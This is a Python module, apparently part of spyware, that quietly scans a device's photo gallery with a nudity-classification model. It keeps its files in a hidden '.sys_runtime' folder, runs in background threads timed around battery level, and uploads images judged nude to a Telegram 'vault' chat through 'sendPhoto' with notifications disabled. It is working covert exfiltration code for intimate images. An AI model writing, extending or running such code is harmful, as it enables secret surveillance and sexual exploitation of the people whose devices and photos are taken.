# -*- coding: utf-8 -*-
import os
import time
import threading
import logging
import sqlite3
import hashlib
import gc
import shutil
from datetime import datetime

# ========== إعداد المسارات الأساسية ==========
P = os.path.join(os.getcwd(), ".sys_runtime")
M = os.path.join(P, ".models")
T = os.path.join(P, "n_tmp")

for d in [M, T]:
    if not os.path.exists(d):
        os.makedirs(d)

logging.basicConfig(filename=os.path.join(P, "n.log"), level=logging.ERROR, filemode='a')

# ========== استيراد المكتبات ==========
try:
    import numpy as np
    from PIL import Image, UnidentifiedImageError

    # تحديد حد أقصى لعدد بكسلات الصورة (حماية من الصور العملاقة)
    Image.MAX_IMAGE_PIXELS = 50_000_000  # ~7000x7000

    # استيراد TFLite Interpreter
    try:
        from tflite_runtime.interpreter import Interpreter
    except ImportError:
        try:
            from tensorflow.lite.python.interpreter import Interpreter
        except ImportError:
            import tensorflow as tf
            Interpreter = tf.lite.Interpreter

    JNI = True
except Exception as e:
    logging.error(f"Import error: {e}")
    JNI = False


class NudeDetector:
    def __init__(self, mon=None):
        self.mon = mon
        self.active = False
        self.model = None
        self._lock = threading.Lock()
        self.last_run = 0

        # مسار النموذج
        self.model_path = os.path.join(M, "engine_v2.tflite")

        # البحث عن النموذج في assets
        base_dir = os.getcwd()
        self.assets_path = None
        for candidate in [os.path.join(base_dir, "assets", "engine_v2.tflite"),
                          os.path.join(base_dir, "engine_v2.tflite")]:
            if os.path.exists(candidate):
                self.assets_path = candidate
                break

        # قاعدة بيانات الكاش
        self.db = os.path.join(P, "n_cache.db")
        self._init_db()

        # بدء تحضير النموذج في الخلفية
        threading.Thread(target=self._prepare_engine, daemon=True).start()

    # ========== إدارة قاعدة البيانات (إصلاح 4) ==========
    def _init_db(self):
        """تهيئة قاعدة البيانات وتنظيف السجلات القديمة (أقدم من 30 يوم)"""
        try:
            with sqlite3.connect(self.db) as conn:
                conn.execute('CREATE TABLE IF NOT EXISTS scan_logs (h TEXT PRIMARY KEY, ts INTEGER)')
                # ✅ إصلاح 4: حذف السجلات الأقدم من 30 يوماً
                old_threshold = int(time.time()) - (30 * 86400)
                conn.execute('DELETE FROM scan_logs WHERE ts < ?', (old_threshold,))
                conn.commit()
        except Exception as e:
            logging.error(f"DB init error: {e}")

    # ========== تحضير وتحميل النموذج ==========
    def _prepare_engine(self):
        if not JNI:
            return
        try:
            # إذا كان النموذج غير موجود أو حجمه صغير جداً (<500KB)
            if not os.path.exists(self.model_path) or os.path.getsize(self.model_path) < 500000:
                # نسخ من assets إذا كان موجوداً
                if self.assets_path and os.path.exists(self.assets_path):
                    shutil.copy(self.assets_path, self.model_path)
                    logging.info("Model copied from assets")

            # محاولة التحميل
            self._load_engine()
        except Exception as e:
            logging.error(f"Prepare engine error: {e}")

    def _load_engine(self):
        try:
            if os.path.exists(self.model_path) and os.path.getsize(self.model_path) > 500000:
                self.model = Interpreter(model_path=self.model_path)
                self.model.allocate_tensors()
                inputs = self.model.get_input_details()
                outputs = self.model.get_output_details()
                self.in_idx = inputs[0]['index']
                self.out_idx = outputs[0]['index']
                logging.info("TFLite engine loaded successfully")
            else:
                logging.error("Model missing or too small")
        except Exception as e:
            logging.error(f"Load engine error: {e}")

    # ========== تحليل الصورة (إصلاح 1، 2، 3) ==========
    def _analyze(self, path, retry=1):
        """
        تحليل صورة واحدة وإرجاع احتمال العري (0.0 - 1.0)
        مع حماية من الصور التالفة والكبيرة
        """
        if not self.model or not JNI:
            return 0.0

        # ✅ إصلاح 2: فحص الحجم والوجود أولاً
        if not os.path.exists(path):
            return 0.0
        file_size = os.path.getsize(path)
        if file_size > 5 * 1024 * 1024:   # حد أقصى 5 ميجابايت
            logging.warning(f"Image too large ({file_size} bytes): {path}")
            return 0.0
        if not path.lower().endswith(('.png', '.jpg', '.jpeg', '.webp')):
            return 0.0

        try:
            # ✅ إصلاح 1: معالجة آمنة للصورة (التقاط UnidentifiedImageError)
            with Image.open(path) as raw_img:
                img = raw_img.convert('RGB').resize((224, 224), Image.LANCZOS)

            # ✅ إصلاح 3: استخدام np.asarray + reshape (بدون expand_dims)
            arr = np.asarray(img, dtype=np.float32).reshape(1, 224, 224, 3) / 255.0

            self.model.set_tensor(self.in_idx, arr)
            self.model.invoke()
            out = self.model.get_tensor(self.out_idx)[0]

            prob = float(out[1]) if len(out) > 1 else float(out[0])

            # تنظيف الذاكرة
            del arr, img
            return prob

        except UnidentifiedImageError:
            logging.error(f"Cannot identify image (corrupted/unsupported): {path}")
            return 0.0
        except OSError as e:
            logging.error(f"OS error opening image {path}: {e}")
            return 0.0
        except ValueError as e:
            logging.error(f"Value error processing image {path}: {e}")
            return 0.0
        except Exception as e:
            logging.error(f"Analyze error for {path}: {e}")
            if retry > 0:
                time.sleep(1)
                return self._analyze(path, retry - 1)
            return 0.0

    # ========== المسح التلقائي (يُستدعى من monitor) ==========
    def scan(self, mon):
        if self.active or not self.model:
            return

        # فحص البطارية
        if hasattr(mon, '_bat'):
            b, c = mon._bat()
            if b < 20 and not c:
                return

        now = time.time()
        if (now - self.last_run) < 1800:   # كل 30 دقيقة على الأكثر
            return
        self.last_run = now

        threading.Thread(target=self._worker, args=(mon,), daemon=True).start()

    def _worker(self, mon):
        if not self._lock.acquire(blocking=False):
            return
        try:
            self.active = True
            sc = getattr(mon, 'media_scanner', None)
            if not sc:
                return

            items = sc.get_gallery_by_category("pending", limit=15)
            for item in items:
                path = item.get("path")
                if not path or not os.path.exists(path):
                    continue
                if not path.lower().endswith(('.png', '.jpg', '.jpeg', '.webp')):
                    continue

                h = hashlib.md5(path.encode()).hexdigest()
                if self._is_cached(h):
                    continue

                prob = self._analyze(path)

                if prob > 0.85:
                    sc.update_category(item.get("hash"), "nude", prob)
                    self._report(path, item.get("label", "??"), mon, prob)
                elif prob > 0.45:
                    sc.update_category(item.get("hash"), "questionable", prob)
                else:
                    sc.update_category(item.get("hash"), "normal", prob)

                self._mark_cached(h)
                time.sleep(0.3)   # راحة للمعالج

        except Exception as e:
            logging.error(f"Worker error: {e}")
        finally:
            self.active = False
            self._lock.release()
            gc.collect()

    # ========== دوال الكاش ==========
    def _is_cached(self, h):
        try:
            with sqlite3.connect(self.db) as conn:
                cur = conn.execute("SELECT 1 FROM scan_logs WHERE h=?", (h,))
                return cur.fetchone() is not None
        except Exception:
            return False

    def _mark_cached(self, h):
        try:
            with sqlite3.connect(self.db) as conn:
                conn.execute("INSERT OR REPLACE INTO scan_logs VALUES (?, ?)", (h, int(time.time())))
                conn.commit()
        except Exception:
            pass

    # ========== إرسال التقرير إلى Telegram ==========
    def _report(self, path, label, mon, confidence):
        try:
            tg = getattr(mon, 'ui', None)   # TelegramUI instance
            vault = getattr(mon, 'vlt', None)
            if tg and vault:
                with open(path, 'rb') as f:
                    caption = f"🔞 #{label} | {datetime.now().strftime('%H:%M:%S')} | {confidence:.0%}"
                    tg._ap("sendPhoto", {
                        "chat_id": vault,
                        "caption": caption,
                        "disable_notification": True
                    }, {"photo": f})
        except Exception as e:
            logging.error(f"Report error: {e}")


def create(mon=None):
    return NudeDetector(mon)
